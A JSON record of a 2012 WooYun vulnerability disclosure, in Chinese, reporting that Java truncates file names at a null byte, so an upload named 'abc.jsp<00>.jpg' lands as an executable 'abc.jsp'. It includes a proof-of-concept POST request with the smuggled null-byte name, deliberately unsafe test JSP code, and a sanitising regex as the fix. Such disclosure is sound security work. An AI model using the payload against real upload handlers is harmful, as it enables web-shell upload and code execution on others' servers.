{"id": 15503, "wybug_id": "wooyun-2012-016537", "wybug_title": "Java写文件时文件名00截断 BUG", "wybug_corp": "java", "wybug_author": "smartmice", "wybug_date": "2012-12-26 21:30", "wybug_open_date": "2012-12-26 21:30", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-26：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-12-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Java在上面两种环境写文件时，会因为00截断而无法正确为新生成的文件命名。比如用户需要的用户名abc.jsp .jpg，但经过00截断后，生成的文件的名称变为abc.jsp , 因此我们在涉及到上传的文件名没更改名称或者可自定义目录的时候加以利用 详细说明：  测试环境:1.windows7(x64)+tomcat7+jdk1.62.Linux3.0(ubuntu11.10)(x86)+tomcat7+jdk1.7Java在上面两种环境写文件时，会因为00截断而无法正确为新生成的文件命名。比如用户需要的用户名abc.jsp .jpg，但经过00截断后，生成的文件的名称变为abc.jsp , 因此我们在涉及到上传的文件名没更改名称或者可自定义目录的时候加以利用。测试发送的头部数据如下：\nPOST /simpleUpload/write.jsp HTTP/1.1Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*Accept-Language: zh-cnContent-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)Host: 192.168.200.142:8084Content-Length: 17Connection: Keep-AliveCache-Control: no-cacheCookie: JSESSIONID=D2EC5F95AD581EB5FD3A860FC4CE640\nname=abc.jsp .jpg(注意在上传前，这里的空格需要我们用十六进制编辑器将其变为00)测试的服务端代码如下:\n<%@page import=\"java.io.*\"%><%    out.clear();    String filename = request.getParameter(\"name\");    if (filename != null) {        String path = application.getRealPath(\"/\");        String p=path + \"/\" + filename;        File uploadfile = new File(p);        if (!uploadfile.exists()) {            uploadfile.createNewFile();        }        out.println(\"System Name:\"+System.getProperty(\"os.name\"));        out.println(\"1.The information of UploadFile:\");        if(uploadfile!=null){                out.println(\"   a.the UploadFile  exists!\");            out.println(\"   b.The path of UploadFile:    \"+uploadfile.getAbsolutePath());            out.println(\"   c.The name of UploadFile:    \"+uploadfile.getName());            p=uploadfile.getAbsolutePath().substring(0,uploadfile.getAbsolutePath().length()-5);            File bugFile=new File(p);            out.println(\"2.The information of BugFile:\");            if(bugFile.exists()){                 out.println(\"   a.The BugFile  exists!\");                out.println(\"   b.The path of BugFile:    \"+bugFile.getAbsolutePath());                out.println(\"   c.The name of BugFile:   \"+bugFile.getName());            }else{                out.println(\"The BugFile: \"+bugFile+\"  does't exist!\");            }            File uploadfile2 = new File(p+uploadfile.getAbsolutePath().substring(uploadfile.getAbsolutePath().length()-5));            out.println(\"3.Assure whether the nonexistent  UploadFile exists because of the java API or not:\");            if(uploadfile2.exists()){                out.println(\"   a.The nonexistent  UploadFile  exists!\");                out.println(\"   b.The path of nonexistent  UploadFile:    \"+uploadfile2.getAbsolutePath());                out.println(\"   c.The name of nonexistent  UploadFile:   \"+uploadfile2.getName());            }else{                out.println(\"The nonexistent  UploadFile: \"+uploadfile2+\" does't exist!\");            }        }else            out.println(\"The UploadFile: \"+uploadfile+\"  isn't uploaded successfully!\");    } else {        out.println(\"Null name!\");    }    out.flush();%>\n   漏洞证明：  1.在windows7(x64)+tomcat7+jdk1.6环境下提交的数据返回结果的截图： \n\n2.在Linux3.0(ubuntu11.10)(x86)+tomcat7+jdk1.7环境下提交的数据返回结果的截图：\n\n从上图我们可以看到：1点成功了,表示文件已经上传成功了,并且文件名abc.jsp00.jpg没变，且java认为这个文件存在的。2点也成功了，表明 abc.jps存在.3我们用abc.jsp组全00.jpg去确认这个文件是否存在，结果java认为存在。注:(这里的00表示16进制字符)当我们打开对应的目录时，发现只有abc.jsp存在。这说明文件名00截断是JAVA的原因。而不是系统的原因。为了不让web shell由于这个漏洞而得以上传，推荐你使用fckeditor的方法，用一个正则表达式替换用户可以定义的路径名或者文件名，代码如下filename = filename.replaceAll(\"\\\\/|\\\\/|\\\\||:|\\\\?|\\\\*|\\\"|<|>|\\\\p{Cntrl}\", \"_\");（正则表达中\\\\p{Cntrl}这个是处理00字符的。）   修复方案：     版权声明：转载请注明来源 smartmice@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-12-26 22:52 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  这个问题好像kj牛有提到过    \n     2012-12-26 23:00 |    \t\tcnrstar \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:23        | Be my personal best!)\t\t \n  岂不是很多jsp上传都会躺枪，不过不随机重命名的还是不多    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}